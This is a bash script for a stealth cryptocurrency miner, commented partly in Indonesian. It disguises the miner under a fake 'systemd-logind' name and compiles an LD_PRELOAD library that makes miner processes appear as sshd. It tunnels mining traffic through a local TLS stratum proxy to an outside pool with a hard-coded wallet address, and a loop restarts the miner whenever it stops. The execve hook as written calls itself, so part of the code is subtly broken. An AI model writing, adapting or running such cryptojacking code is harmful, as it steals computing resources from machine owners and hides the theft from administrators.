#!/bin/bash
 
FAKE_NAME="systemd-logind-$(shuf -i 1000-9999 -n 1)"
FAKE_PATH="/usr/local/bin/${FAKE_NAME}"
PORT=443

echo "🔒 Starting TLS Proxy + Stealth Miner..."

# Jalankan TLS Proxy (aiostratum-proxy)
python3 -m aiostratum_proxy \
  --host 0.0.0.0 \
  --port ${PORT} \
  --pool-host asia.rplant.xyz \
  --pool-port 17059 \
  --pool-ssl \
  > proxy.log 2>&1 &

sleep 10

# Stealth Miner
cp /usr/local/bin/miner "$FAKE_PATH"
chmod +x "$FAKE_PATH"

# LD_PRELOAD Hide
cat > /tmp/hide.c << 'EOF'
#include <stdio.h>
#include <string.h>
int execve(const char *filename, char *const argv[], char *const envp[]) {
    if (strstr(filename, "miner") || strstr(argv[0], "miner")) argv[0] = "/usr/sbin/sshd";
    return execve(filename, argv, envp);
}
EOF

gcc -shared -fPIC -o /tmp/hide.so /tmp/hide.c -ldl 2>/dev/null || true

echo "Launching miner..."

if [ -f /tmp/hide.so ]; then
    LD_PRELOAD=/tmp/hide.so "$FAKE_PATH" \
      -a yespowertide \
      -o stratum+tcps://127.0.0.1:${PORT} \
      -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H \
      -p x \
      -t 2 \
      -B --no-color > /dev/null 2>&1 &
else
    "$FAKE_PATH" \
      -a yespowertide \
      -o stratum+tcps://127.0.0.1:${PORT} \
      -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H \
      -p x \
      -t 2 \
      -B --no-color > /dev/null 2>&1 &
fi

echo "✅ TLS + Stealth Active!"

while true; do
    sleep 30
    if ! pgrep -f ${FAKE_NAME} > /dev/null 2>&1; then
        echo "Restarting..."
        if [ -f /tmp/hide.so ]; then
            LD_PRELOAD=/tmp/hide.so "$FAKE_PATH" -a yespowertide -o stratum+tcps://127.0.0.1:${PORT} -u TFCzMrjWvFXx2xsEE7QjZ4fTbxCezXGK9H -p x -t 2 -B > /dev/null 2>&1 &
        fi
    fi
done
